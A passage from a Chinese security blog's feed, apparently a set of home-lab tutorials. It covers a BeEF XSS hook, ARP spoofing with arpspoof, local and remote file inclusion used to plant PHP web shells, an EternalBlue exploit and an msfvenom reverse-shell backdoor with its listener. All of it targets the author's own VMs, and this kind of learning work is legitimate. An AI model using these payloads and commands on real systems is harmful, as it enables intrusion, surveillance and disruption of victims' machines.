//在kali中启动apache</span><br></pre></td></tr></table></figure><p>因为我的kali版本是2021没有Beef，所以需要自己安装，详细安装步骤<a href="https://blog.csdn.net/weixin_43847838/article/details/110312851">参考这里</a></p><p>安装完成后即可打开Beef</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beef-xss</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252047993.png" alt="image-20220225204721455"></p><p>如果是第一次打开，就要重新设置一下密码(默认账号密码都是beef)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252050369.png" alt="image-20220225205012269"></p><p>打开的时候有说明Beef的使用图形界面、钩子hook的使用和Script的一段hook使用脚本，非常贴心(127.0.0.1换成kali的IP)</p><p>登录到图形界面后账号是beef，密码是刚刚设置的密码</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252051259.png" alt="image-20220225205152210"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252054951.png" alt="image-20220225205401771"></p><p>登陆成功之后可以看到界面非常简洁，因为现在还没有上钩的主机</p><h2 id="上钩过程"><a href="#上钩过程" class="headerlink" title="上钩过程"></a>上钩过程</h2><p>我们在物理机(IP为192.168.29)把刚刚beef提供的Script脚本粘贴到DVWA的XSS存储模块XSS stored的输入框中，把127.0.0.1换成kali的IP地址，我的kali的IP地址为：192.168.1.11</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://192.168.29.137:3000/hook.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252057778.png" alt="image-20220225205715707"></p><p>提交之后先上钩的是自己的主机，因为提交之后会自动刷新页面，可以在beef中看到已经上钩了，文件夹的名字是该网页服务器的IP，但是上钩的IP地址为192.168.29.1，也不是物理机的IP地址，因为192.168.29.1是VMnet8，物理机的虚拟网卡的IP，物理机和虚拟机之间通信就是通过虚拟网卡来通信的</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252059194.png" alt="image-20220225205937122"></p><p>这里我们再在kali(攻击机)和win7(搭建DVWA的主机)中用浏览器打开XSS stored页面，看看上钩的IP地址是多少(记得每次登陆把DVWA security模式调为Low)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202252109546.png" alt="image-20220225210907454"></p><p>可以看到 kali的IP：192.168.29.137和win7的IP：192.168.29.140都已经上钩了，而且状态是浏览器正在这个页面(Online)，而物理机的浏览器已经关掉了这个页面所以状态是Offline</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/tugenhua0707/p/10909284.html">https://www.cnblogs.com/tugenhua0707/p/10909284.html</a></p><p><a href="https://www.bilibili.com/video/BV1E4411L7zS?p=19">https://www.bilibili.com/video/BV1E4411L7zS?p=19</a></p>]]></content>
    
    
    <summary type="html">XSS的原理及简单实验</summary>
    
    
    
    <category term="DVWA" scheme="https://jason177.com/categories/DVWA/"/>
    
    
    <category term="XSS" scheme="https://jason177.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>ARP的原理及欺骗</title>
    <link href="https://jason177.com/2022/02/22/arp-spoofing/"/>
    <id>https://jason177.com/2022/02/22/arp-spoofing/</id>
    <published>2022-02-22T12:08:18.000Z</published>
    <updated>2022-02-25T03:05:27.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h1><p>ARP(Address Resolution Protocol，地址解析协议)是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。</p><p>ARP协议基本功能：<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA/455151">主机</a>发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址，收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><p>ARP被利用的原因：地址解析协议是建立在网络中各个主机互相信任的基础上的，<strong>局域网络上的主机</strong>可以自主发送ARP应答消息，其他主机收到应答报文时<strong>不会检测</strong>该报文的真实性就会将其记入本机ARP缓存；由此攻击者就可以向某一主机发送伪ARP应答报文，使其发送的信息无法到达预期的主机或到达错误的主机，这就构成了一个<a href="https://baike.baidu.com/item/ARP%E6%AC%BA%E9%AA%97">ARP欺骗</a>。</p><p>工作流程：</p><div class="note green icon simple"><i class="note-icon fas fa-bullhorn"></i><p>主机A的IP地址：192.168.1.1 , MAC地址：0A-11-22-33-44-01</p><p>主机B的IP地址：192.168.1.2，MAC地址：0A-11-22-33-44-02</p><p>当主机A想要与主机B通信时，ARP可以将主机B的IP地址解析成主机B的MAC地址然后缓存到主机A中，下次访问就直接检查本地ARP缓存。</p><ol><li>一开始主机A想要访问IP地址为192.168.1.2的主机B，所以先在自己本地ARP缓存中检查192.168.1.2所匹配的MAC地址</li><li>如果主机A没有在ARP缓存中找到IP与MAC的映射，它将会把ARP请求帧广播到本地网络上的所有主机，源主机A的IP地址和MAC地址都包含在ARP请求中。局域网中的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，则丢弃ARP请求包。</li><li>主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和主机A的MAC地址映射添加本地ARP缓存中。</li><li>主机B将包含着主机B的MAC地址的ARP回复消息返回给主机A，主机A在本地更新主机B的IP地址和主机B的MAC地址映射缓存。</li><li>本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</li></ol></div><p>ARP攻击的攻击原理：ARP攻击就是通过伪造IP地址和MAC地址实现ARP欺骗，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断的发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>常见的ARP欺骗手法：同时对局域网内的一台主机和网关进行ARP欺骗，更改这台主机和网关的ARP缓存表。</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222102954.jpeg" alt="img"></p><p><a href="https://blog.csdn.net/vaeloverforever/article/details/84504876">参考链接</a></p><h2 id="ARP欺骗实验"><a href="#ARP欺骗实验" class="headerlink" title="ARP欺骗实验"></a>ARP欺骗实验</h2><p>实验环境：</p><ol><li>靶机：win7（IP地址：192.168.29.140，MAC地址：00-0C-29-3A-FE-31）</li><li>攻击机：kali（IP地址：192.168.29.137，MAC地址：00:0c:29:d5:b6:5d）</li><li>工具：kali下的arpspoof</li></ol><h3 id="使用arpspoof进行ARP断网"><a href="#使用arpspoof进行ARP断网" class="headerlink" title="使用arpspoof进行ARP断网"></a>使用arpspoof进行ARP断网</h3><p>请注意：ARP欺骗只适用于同一局域网内，上面就说过了:)</p><p>查看靶机的IP地址和MAC地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig -all</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222124735.png" alt="image-20220222212451572"></p><p>查看攻击机kali的IP地址、MAC地址和网卡</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222126549.png" alt="image-20220222212612492"></p><p>在攻击机中通过<a href="https://www.cnblogs.com/catlee/p/7360127.html">fping命令</a>查看当前局域网内存在的主机，以此来寻找可攻击的主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fping -g 192.168.29.0/24    //ping 192.168.29.0网段的所有存活主机</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222130205.png" alt="image-20220222213007115"></p><p>192.168.29.1是物理机的VMnet8的虚拟网卡，192.168.29.2是虚拟机网关</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222138375.png" alt="image-20220222213755188"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222138328.png" alt="image-20220222213820291"></p><p>再往下拉</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222142628.png" alt="image-20220222214044724"></p><p>192.168.29.137是kali本机，192.168.29.140是win7靶机，对于kali来说，win7相当于局域网内的另一台主机，可以进行攻击。</p><p>在进行攻击前，先ping一下win7靶机的ip地址192.168.29.140查看是否可以进行通信</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222144060.png" alt="image-20220222214412012"></p><p>可以通信，为了查看win7中的ARP缓存是否有被修改，在攻击之前先看一下win7中的ARP本地缓存</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222146816.png" alt="image-20220222214608764"></p><p>可以看到kali的IP地址192.168.29.137对应的MAC地址为00:0c:29:d5:b6:5d，网关的IP地址192.168.29.2对应的MAC地址为00-50-56-e4-36-8c</p><p>然后查看一下呗攻击之前win7的上网状态，ping一下百度</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222148348.png" alt="image-20220222214818307"></p><p>没有包丢失，说明此时被攻击主机可以上网</p><p>在kali中打开arpspoof工具，对物理机发起ARP攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i eth0 -t 192.168.29.140 192.168.29.2    //i参数后面接kali的网卡，t参数后面接要攻击的主机ip和网关</span><br></pre></td></tr></table></figure><p>意思是要接管要攻击的主机发往网关的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222152043.png" alt="image-20220222215236964"></p><p>可以看到kali正在向win7发送ARP应答包，这个应答包将网关的IP地址192.168.29.2和kali的MAC地址00:0c:29:d5:b6:5d绑定起来，从而更改win7中的ARP缓存表，缓存表中网关的MAC地址变更为kali的MAC地址00:0c:29:d5:b6:5d，每次发往网关192.168.29.2的数据包都将会发给MAC地址为00:0c:29:d5:b6:5d的kali</p><p>查看win7是否还能ping通百度</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222155741.png" alt="image-20220222215537699"></p><p>已经ping不通百度，打开浏览器看是否可以上网</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222157137.png" alt="image-20220222215714041"></p><p>已经打不开新浪网，再查看一下ARP缓存表</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222156561.png" alt="image-20220222215652523"></p><p>可以看到网关对应的MAC地址已经变成kali的MAC地址了，网关192.168.29.2对应的MAC地址和kali的MAC地址一模一样，所以该win7已经遭遇了ARP攻击</p><p>在kali终端中ctrl+c停止发送ARP应答包之后，在win7刷新一下浏览器，就可以正常上网了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222200870.png" alt="image-20220222220046786"></p><p>再查看ARP缓存表，网关的MAC地址又恢复了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202222202166.png" alt="image-20220222220201109"></p><p>ARP欺骗可以截获被攻击主机的一些隐私信息等，通过arpspoof和driftnet就可以截获到被攻击机的图片，<a href="https://blog.csdn.net/vaeloverforever/article/details/84504876">可以看这里</a>，下面就不再过多叙说</p>]]></content>
    
    
    <summary type="html">简单描述ARP的原理以及实操</summary>
    
    
    
    <category term="Kali" scheme="https://jason177.com/categories/Kali/"/>
    
    
    <category term="ARP" scheme="https://jason177.com/tags/ARP/"/>
    
  </entry>
  
  <entry>
    <title>File-Inclusion</title>
    <link href="https://jason177.com/2022/02/20/file-inclusion/"/>
    <id>https://jason177.com/2022/02/20/file-inclusion/</id>
    <published>2022-02-20T11:50:03.000Z</published>
    <updated>2022-02-21T02:55:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File-Inclusion"></a>File-Inclusion</h1><div class="note blue icon flat"><i class="note-icon fas fa-bullhorn"></i><p>File-Inclusion：文件包含，是在开发人员希望代码更加灵活的时候将被包含的文件设置为变量用来进行动态调用(其实就是把重复使用的函数写到单个文件中，需要使用这个函数的时候就直接调用该文件而无需再次编写)，本身文件包含就是一个正常行为，但是如果没有其它过滤手段，就会导致客户端可以调用一个恶意的文件，造成文件包含漏洞。</p></div><p><a href="https://blog.csdn.net/qq_39431542/article/details/88628225">参考链接1</a></p><p><a href="https://www.bilibili.com/video/BV1E4411L7zS">参考链接2</a></p><h2 id="漏洞的场景与利用条件"><a href="#漏洞的场景与利用条件" class="headerlink" title="漏洞的场景与利用条件"></a>漏洞的场景与利用条件</h2><p>一般在PHP中出现文件包含。服务器执行PHP文件时，可以通过包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。</p><p> 漏洞利用条件：</p><ol><li><strong>程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件</strong></li><li><strong>用户能够控制该动态变量</strong></li><li><strong>要保证php.ini中allow_url_fopen和allow_url_include为On</strong></li></ol><p>而需要注意的是：</p><ol><li><strong>PHP中只要文件内容符合PHP语法规范，包含时不管扩展名是什么都会被PHP解析</strong></li><li><strong>若文件内容不符合PHP语法规范则会暴露源码</strong></li><li>PHP4存在远程文件包含与本地文件包含，但是PHP5只存在本地文件包含</li></ol><p>接下来我会通过DVWA里的File Inclusion模块来讲解本地包含漏洞和远程包含漏洞(虽然简单，但是其实我就是来水一下文章的)</p><p>在这之前我们先看一下各系统中的敏感文件</p><p><strong>Windows</strong>:</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202146734.png" alt="image-20220220214621088"></p><p><strong>Linux/Unix:</strong></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202147589.png" alt="image-20220220214720435"></p><h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><p>首先在DVWA中在DVWA Security中把模式调成Low，然后点击File Inclusion模块</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202149937.png" alt="image-20220220214953868"></p><p>在上面URL栏中可以看到后面的”?page=include.php”，说明在index.php(默认网页，上面没有显示)中存在着文件包含的功能，且当前包含的文件是”page=”后面的include.php文件</p><p>而如果当前目录没有该文件的话则会出现警告</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202159034.png" alt="image-20220220215946971"></p><p>phpinfo.php文件在dvwa的根目录下，可以根据相对路径来查看该文件</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202202201216.png" alt="image-20220220220110140"></p><p>也可以根据绝对路径来查看该文件或者其他文件，比如我在C:\phpstudy中创建一个名为”jason.txt”的文件，内容是”hello world”，且我的虚拟机IP为：192.168.29.140，则：如果是Windows从物理机中访问该文件的URL是”<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/?page=C:/phpstudy/jason.txt&quot;">http://192.168.29.140/dvwa/vulnerabilities/fi/?page=C:/phpstudy/jason.txt&quot;</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210134875.png" alt="image-20220221013434770"></p><p>可以访问该文件并且显示在页面中，说明确实有文件包含漏洞，这样的话就可以依靠内容的回显把系统的一些隐私信息显示到页面中，比如如果是Linux的系统，则可以查看”/etc/passwd”下的信息，即”<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/?page=/etc/passwd&quot;%E3%80%82**%E6%89%80%E4%BB%A5%E5%A6%82%E6%9E%9C%E8%A6%81%E8%AE%BF%E9%97%AE%E6%96%87%E4%BB%B6%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E8%AF%A5%E7%BD%91%E7%AB%99%E6%98%AFWindows%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA%E7%9A%84%E8%BF%98%E6%98%AFLinux%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA%E7%9A%84%EF%BC%8C%E5%9B%A0%E4%B8%BA%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E6%98%AF%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E3%80%82">http://192.168.29.140/dvwa/vulnerabilities/fi/?page=/etc/passwd&quot;。**所以如果要访问文件需要知道该网站是Windows系统搭建的还是Linux系统搭建的，因为绝对路径的使用方法是不一样的。</a>**</p><p>如果一个网站文件上传没有漏洞的话，我们可以把生成木马的php语句放在图片中，然后利用文件包含的漏洞，打开带有php语句的图片，就可以在后台中生成木马。</p><p>我们在网上找到一张jpg图片(好像是越小越好，可能是插入php语句破坏文件的概率会小一点)</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210425176.png" alt="image-20220221042537137"></p><p>然后把jpg图片拖进edjpgcom.exe(用其他方法也行)，在弹出来的输入框中输入会生成一句话木马的php语句，然后一张”被插入”php语句的jpg图片就做好了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210427695.png" alt="image-20220221042727642"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210425588.png" alt="image-20220221042501531"></p><p>这里php语句的内容是被执行后生成shell25.php文件，而该shell25.php文件的内容就是后面那串一句话木马</p><p>然后我们在DVWA中把级别调成Low，然后在File Upload文件上传中把该图片文件shell.jpg上传上去</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210428245.png" alt="image-20220221042836194"></p><p>然后把提示的路径复制下来，再打开File Inclusion文件包含模块，把”../../hackable/uploads/shell.jpg”复制到”page=”后面，即：<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg">http://192.168.29.140/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg</a></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210420899.png" alt="image-20220221042017821"></p><p>出现了图片文件中的乱码，说明执行图片成功了，刚刚的shell.jpg就会生成shell25.php，且密码是”yangge”，我们可以在DVWA的后台看到确实生成了shell25.php</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210421379.png" alt="image-20220221042138314"></p><p>然后我们打开菜刀或者蚁剑等连接木马的工具进行连接。请注意：生成的shell25.php不是在图片上传的位置，而是在文件包含漏洞的当前位置，即：<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/">http://192.168.29.140/dvwa/vulnerabilities/fi/</a> 。所以URL地址为”<a href="http://192.168.29.140/dvwa/vulnerabilities/fi/shell25.php&quot;">http://192.168.29.140/dvwa/vulnerabilities/fi/shell25.php&quot;</a> ，连接密码为”yangge”</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210436974.png" alt="image-20220221043647920"></p><p>点击左上角添加之后，就可以连接到DVWA的机器后台了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210438860.png" alt="image-20220221043809780"></p><h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p> 一般 PHP 默认关闭远程包含，开启远程文件包含功能需要在 php.ini 中修改：<br>Allow_url_include = on</p><p><strong>在使用远程包含时，不能包含.php文件，否则会执行不成功，所以一般包含的是txt文件。但是可以执行.php文件中的echo输出语句。</strong></p><p>远程文件包含意思就是在本地的文件中把远程的文件包含进来，通俗来说就是访问远程服务器的链接来包含远程文件。所以远程文件包含比本地文件包含更简单一点，因为远程文件包含可以在远程服务器中准备好我们的木马，只要把远程带有木马的文件路径写在带有漏洞的URL中即可。</p><p>现在我们把kali当成远程服务器，在kali中打开apache2</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210441791.png" alt="image-20220221044100663"></p><p>打开apache2之后我们就可以通过kali的ip地址访问到默认网页，这里我的kali的ip地址为：192.168.29.137</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210442761.png" alt="image-20220221044226685"></p><p>然后kali的apache默认路径为：/var/www/html/ ， 所以我们在该路径下写一个123.txt文件，里面的内容依然是可以生成一句话木马的php语句</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210456854.png" alt="image-20220221045627722"></p><p>所以该文件的路径为：192.168.29.137/123.txt</p><p>所以我们把该路径放在”page=”后面，即可把该路径中会生成木马的123.txt包含到192.168.29.140这台主机的文件中</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210502544.png" alt="image-20220221050223493"></p><p>这里什么也没显示说明成功了，因为它只是一个txt文件</p><p>这里我们再次利用蚁剑，清空刚才的数据以及缓存之后重新连接新的一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210504732.png" alt="image-20220221050425673"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202202210504989.png" alt="image-20220221050433900"></p><p>连接成功，并且可以看到shell30.php已经存在于默认路径中</p>]]></content>
    
    
    <summary type="html">本地文件包含和远程文件包含</summary>
    
    
    
    <category term="DVWA" scheme="https://jason177.com/categories/DVWA/"/>
    
    
    <category term="FIle-Inclusion" scheme="https://jason177.com/tags/FIle-Inclusion/"/>
    
  </entry>
  
  <entry>
    <title>Metasploit的简单使用</title>
    <link href="https://jason177.com/2021/12/09/metasploit/"/>
    <id>https://jason177.com/2021/12/09/metasploit/</id>
    <published>2021-12-09T14:05:53.000Z</published>
    <updated>2021-12-09T14:10:53.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h1><p>msf(metasploit framework)是一款开源安全漏洞利用和测试工具，集成了各种平台上常见的溢出漏洞和流行的shellcode，并持续保持更新。</p><p>kali控制台输入msfconsole即可进入msf</p><p>msf使用法则：</p><ol><li>使用模块(use)</li><li>配置模块必选项(set)</li><li>运行模块(run)</li></ol><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091313778.png" alt="image-20211209131307626"></p><h2 id="永恒之蓝利用"><a href="#永恒之蓝利用" class="headerlink" title="永恒之蓝利用"></a>永恒之蓝利用</h2><p>微软会把每年的漏洞按序号排序，比如永恒之蓝的漏洞代号为<strong>ms17_010</strong>(表示Microsoft 2017年的第十个漏洞)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole         //进入metasploit</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ms17_010    //查看漏洞信息</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091330903.png" alt="image-20211209133016641"></p><h3 id="1-使用模块"><a href="#1-使用模块" class="headerlink" title="1.使用模块"></a>1.使用模块</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use 0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091331081.png" alt="image-20211209133137982"></p><p>没有配置payload的值，默认使用windows/x64/meterpreter/reverse_tcp，如果默认不是这个，我们可以自己设置(set payload windows/x64/meterpreter/reverse_tcp)</p><h3 id="2-配置必选项"><a href="#2-配置必选项" class="headerlink" title="2.配置必选项"></a>2.配置必选项</h3><p>先查看配置项</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091334790.png" alt="image-20211209133418508"></p><p>这里要设置我们要攻击的主机(RHOSTS)，永恒之蓝的远程攻击端口为445，下面的LHOST是我们的kali主机的ip，LPORT为监听端口(可以自定义修改，1~65535端口，只要没有端口冲突就行)</p><blockquote><p>exploit:漏洞攻击脚本(比如火箭)</p><p>payload:攻击载荷(火箭上的卫星，起实际作用的部分)</p></blockquote><p>查看win7的ip为：192.168.29.140</p><p>则我们在kali的msf6命令行中输入(能一次性set，比如set RHOSTS=192.168.29.140 LPORT=10000)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.29.140</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 10000</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091345935.png" alt="image-20211209134501524"></p><h3 id="3-运行模块"><a href="#3-运行模块" class="headerlink" title="3.运行模块"></a>3.运行模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091346176.png" alt="image-20211209134659007"></p><p>已经得到了win7的控制</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091351905.png" alt="image-20211209135151799"></p><p>这里我们可以输入shell进入cmd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091501782.png" alt="image-20211209150157592"></p><p>exit 退出，而且攻击是实时的 如果对方关机了就不行了</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091408205.png" alt="image-20211209140802143"></p><h2 id="生成后门msfvenom"><a href="#生成后门msfvenom" class="headerlink" title="生成后门msfvenom"></a>生成后门msfvenom</h2><p>这个没有利用漏洞，而是利用木马后门</p><h3 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h3><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091422484.png" alt="image-20211209142238181"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o /root/demo.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091427877.png" alt="image-20211209142716737"></p><p>然后目录下可以找到demo.exe这个文件</p><p>然后我们继续在kali使用模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; show options  //查看配置必选项</span><br><span class="line">msf6 exploit(multi/handler)&gt; set lhost 192.168.29.137   //设置kali主机的ip</span><br><span class="line">msf6 exploit(multi/handler)&gt; set lport 10000            //设置监听端口</span><br><span class="line">msf6 exploit(multi/handler)&gt; run      //开始监听，等待...</span><br></pre></td></tr></table></figure><p>然后把demo.exe文件复制给win7，并且win7运行</p><p>然后发现报错了…</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091440949.png" alt="image-20211209144045870"></p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091441120.png" alt="image-20211209144101008"></p><p>看了下sessions，发现本地主机和远程主机的ip与端口都没毛病…</p><p>然后再show options，发现</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091439003.png" alt="image-20211209143948836"></p><p>这个payload和前面创建demo.exe设置的payload不是同一个(<a href="https://blog.csdn.net/zhang35/article/details/105675341">解决方法</a>)，所以我们需要：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091443593.png" alt="image-20211209144313365"></p><p>连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/xssqg/image/202112091526505.png" alt="image-20211209152636124"></p><p>…攻击了我的物理机，监听了我的摄像头….</p><hr><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>所以生成远程木马后门的主要流程为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.29.137 LPORT=10000 -f exe -o /root/demo.exe</span><br><span class="line">msf6 &gt; use exploit/multi/handlermsf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options  //查看配置必选项</span><br><span 